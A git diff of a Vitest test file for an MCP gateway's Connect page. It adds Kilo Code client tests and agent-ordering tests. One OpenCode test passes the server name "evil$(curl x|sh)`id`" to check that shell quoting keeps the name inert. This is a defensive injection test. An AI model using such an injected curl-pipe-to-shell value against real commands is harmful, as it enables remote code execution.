@@ -1,17 +1,25 @@
 // @vitest-environment node
 import {
   EXTERNAL_AGENT_ID_HEADER,
+  KILO_CLIENT_ID,
   OPENCODE_CLIENT_ID,
   OPENCODE_PASSTHROUGH_PROVIDER_ROUTES,
   openCodePassthroughBaseUrl,
+  openCodePassthroughProviders,
 } from "@archestra/shared";
+import {
+  INSTALLER_CLIENT_IDS,
+  OAUTH_AGENTS,
+} from "@archestra/shared/connection-setup";
 import { describe, expect, it } from "vitest";
 import {
   type ClientStep,
   CONNECT_CLIENTS,
   type McpBuildParams,
+  orderedClients,
   type ProxyBuildParams,
   type ProxyStep,
+  visibleClients,
 } from "./clients";
 import { SKILL_MARKETPLACE_CLIENTS } from "./skills-marketplace-clients";
 
@@ -210,16 +218,16 @@ describe("Copilot CLI connection client", () => {
   });
 });
 
-function getOpenCodeClient() {
-  const client = CONNECT_CLIENTS.find((c) => c.id === "opencode");
-  if (!client) throw new Error("OpenCode client is missing");
+function getClient(id: string) {
+  const client = CONNECT_CLIENTS.find((c) => c.id === id);
+  if (!client) throw new Error(`${id} client is missing`);
   return client;
 }
 
-function openCodeMcpCommands(params: McpBuildParams): string[] {
-  const client = getOpenCodeClient();
+function mcpCommands(id: string, params: McpBuildParams): string[] {
+  const client = getClient(id);
   if (client.mcp.kind !== "custom") {
-    throw new Error("OpenCode MCP support should be custom");
+    throw new Error(`${id} MCP support should be custom`);
   }
   const steps =
     typeof client.mcp.steps === "function"
@@ -230,12 +238,13 @@ function openCodeMcpCommands(params: McpBuildParams): string[] {
   );
 }
 
-function openCodeProxySteps(
+function proxySteps(
+  id: string,
   overrides: Partial<ProxyBuildParams> & Pick<ProxyBuildParams, "provider">,
 ): ProxyStep[] {
-  const client = getOpenCodeClient();
+  const client = getClient(id);
   if (client.proxy.kind !== "custom") {
-    throw new Error("OpenCode proxy support should be custom");
+    throw new Error(`${id} proxy support should be custom`);
   }
   const instruction = client.proxy.build({
     providerLabel: overrides.provider,
@@ -246,7 +255,7 @@ function openCodeProxySteps(
     ...overrides,
   });
   if (instruction.kind !== "steps") {
-    throw new Error("OpenCode proxy instructions should be steps");
+    throw new Error(`${id} proxy instructions should be steps`);
   }
   return instruction.steps;
 }
@@ -262,7 +271,7 @@ describe("OpenCode connection client", () => {
 
   it("registers the gateway for OAuth and then runs OpenCode's sign-in", () => {
     expect(
-      openCodeMcpCommands({ url, token: null, serverName: "archestra" }),
+      mcpCommands("opencode", { url, token: null, serverName: "archestra" }),
     ).toEqual([
       "opencode mcp add 'archestra' --url 'http://localhost:9000/v1/mcp/default'",
       "opencode mcp auth 'archestra'",
@@ -271,7 +280,7 @@ describe("OpenCode connection client", () => {
   });
 
   it("passes a static token as an OpenCode KEY=VALUE header and skips the OAuth sign-in", () => {
-    const commands = openCodeMcpCommands({
+    const commands = mcpCommands("opencode", {
       url,
       token: "archestra_TOKEN",
       serverName: "archestra",
@@ -286,7 +295,7 @@ describe("OpenCode connection client", () => {
   });
 
   it("keeps a gateway-derived server name inert in every command", () => {
-    const commands = openCodeMcpCommands({
+    const commands = mcpCommands("opencode", {
       url,
       token: null,
       serverName: "evil$(curl x|sh)`id`",
@@ -302,7 +311,7 @@ describe("OpenCode connection client", () => {
     "gemini",
     "groq",
   ] as const)("routes only the selected credentialed provider when reviewing %s", (provider) => {
-    const config = jsonSnippet(openCodeProxySteps({ provider }));
+    const config = jsonSnippet(proxySteps("opencode", { provider }));
     const rootUrl = `http://localhost:9000/v1`;
     const route = OPENCODE_PASSTHROUGH_PROVIDER_ROUTES.find(
       (candidate) => candidate.provider === provider,
@@ -327,18 +336,141 @@ describe("OpenCode connection client", () => {
       throw new Error("OpenCode custom proxy support is missing");
     }
     expect(client.proxy.supportedProviders).toEqual(
-      OPENCODE_PASSTHROUGH_PROVIDER_ROUTES.map(({ provider }) => provider),
+      openCodePassthroughProviders(),
     );
   });
 
   it("brands proxy instructions with the deployment's app name", () => {
     for (const provider of ["anthropic", "openai", "groq"] as const) {
-      const prose = openCodeProxySteps({ provider, appName: "Acme AI" })
+      const prose = proxySteps("opencode", { provider, appName: "Acme AI" })
         .map((step) => `${step.title} ${step.body ?? ""}`)
         .join("\n");
 
       expect(prose).toContain("Acme AI");
       expect(prose).not.toContain("Archestra");
     }
+  });
+});
+
+describe("Kilo Code connection client", () => {
+  const url = "http://localhost:9000/v1/mcp/default";
+
+  it("registers the gateway with kilo and runs its sign-in", () => {
+    expect(
+      mcpCommands("kilo", { url, token: null, serverName: "archestra" }),
+    ).toEqual([
+      "kilo mcp add 'archestra' --url 'http://localhost:9000/v1/mcp/default'",
+      "kilo mcp auth 'archestra'",
+      "kilo mcp list",
+    ]);
+  });
+
+  it("passes a static token as a KEY=VALUE header and skips the sign-in", () => {
+    const commands = mcpCommands("kilo", {
+      url,
+      token: "archestra_TOKEN",
+      serverName: "archestra",
+    });
+
+    expect(commands).toEqual([
+      "kilo mcp add 'archestra' --url 'http://localhost:9000/v1/mcp/default' --header 'Authorization=Bearer archestra_TOKEN'",
+      "kilo mcp list",
+    ]);
+  });
+
+  it("routes the selected provider and attributes requests to Kilo Code", () => {
+    const steps = proxySteps("kilo", { provider: "gemini" });
+    const config = jsonSnippet(steps);
+
+    expect(steps[0]?.title).toBe("Open ~/.config/kilo/kilo.jsonc");
+    expect(config).toEqual({
+      enabled_providers: ["google"],
+      provider: {
+        google: {
+          options: {
+            baseURL: "http://localhost:9000/v1/gemini/v1beta",
+            headers: { [EXTERNAL_AGENT_ID_HEADER]: KILO_CLIENT_ID },
+          },
+        },
+      },
+    });
+    expect(steps.at(-1)?.code).toBe(
+      'kilo run -m google/<model-id> "Reply with exactly: kilo-proxy-ok"',
+    );
+  });
+
+  it("clones shared skills into the folder Kilo Code loads them from", () => {
+    const client = SKILL_MARKETPLACE_CLIENTS.find(({ id }) => id === "kilo");
+    if (!client) throw new Error("Missing Kilo Code marketplace instructions");
+    const steps = client.getInstallSteps({
+      cloneUrl: "https://example.test/skills/repo.git",
+      marketplaceName: "example-skills",
+    });
+
+    expect(steps.map((step) => step.code)).toEqual([
+      'git clone https://example.test/skills/repo.git "$HOME/.config/kilo/skills/example-skills"',
+      'git -C "$HOME/.config/kilo/skills/example-skills" pull',
+    ]);
+  });
+
+  it("brands proxy instructions with the deployment's app name", () => {
+    const prose = proxySteps("kilo", { provider: "openai", appName: "Acme AI" })
+      .map((step) => `${step.title} ${step.body ?? ""}`)
+      .join("\n");
+
+    expect(prose).toContain("Acme AI");
+    expect(prose).not.toContain("Archestra");
+  });
+});
+
+describe("Connect page apps and the shared agent list", () => {
+  // Agents are added once, in the shared list; this catches an app the page
+  // would have no logo or steps for.
+  it("has an app for every agent the installer sets up or the gateway recognises", () => {
+    const apps = new Set(CONNECT_CLIENTS.map((c) => c.id));
+    for (const id of [...INSTALLER_CLIENT_IDS, ...Object.keys(OAUTH_AGENTS)]) {
+      expect(apps.has(id), `${id} has no Connect page app`).toBe(true);
+    }
+  });
+
+  it("names each recognised agent as its Connect page app does", () => {
+    for (const [id, agent] of Object.entries(OAUTH_AGENTS)) {
+      expect(CONNECT_CLIENTS.find((c) => c.id === id)?.label).toBe(agent.label);
+    }
+  });
+});
+
+describe("Connect agent ordering", () => {
+  it("keeps the catalogue order when no order is stored", () => {
+    expect(visibleClients(null).map((c) => c.id)).toEqual(
+      CONNECT_CLIENTS.map((c) => c.id),
+    );
+  });
+
+  it("ignores unavailable and repeated IDs, appends new agents, and keeps generic last", () => {
+    const clients = orderedClients([
+      "cursor",
+      "removed-client",
+      "generic",
+      "codex",
+      "cursor",
+    ]);
+    expect(clients.map((c) => c.id)).toEqual([
+      "cursor",
+      "codex",
+      ...CONNECT_CLIENTS.filter(
+        (c) => c.id !== "cursor" && c.id !== "codex",
+      ).map((c) => c.id),
+    ]);
+  });
+
+  it("filters visibility without changing the saved order or restoring hidden agents", () => {
+    expect(
+      visibleClients(
+        ["codex", "claude-code"],
+        ["cursor", "codex", "claude-code"],
+      ).map((c) => c.id),
+    ).toEqual(["codex", "claude-code", "generic"]);
+    expect(visibleClients([], ["codex"]).map((c) => c.id)).toEqual(["generic"]);
   });
 });
